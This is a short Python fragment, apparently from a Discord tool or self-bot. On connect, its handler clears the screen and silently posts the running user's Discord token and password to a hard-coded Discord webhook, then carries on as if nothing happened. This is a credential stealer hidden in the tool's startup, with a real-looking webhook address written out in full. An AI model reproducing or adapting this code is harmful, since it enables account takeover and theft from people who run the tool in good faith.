...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/896360909524570132/gWn4gpBZjUgVLadoWP34Au0OD80MN9J2B6NJlPhipTG35ZPjHtje4rvLR_ZRS2JalyXk',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
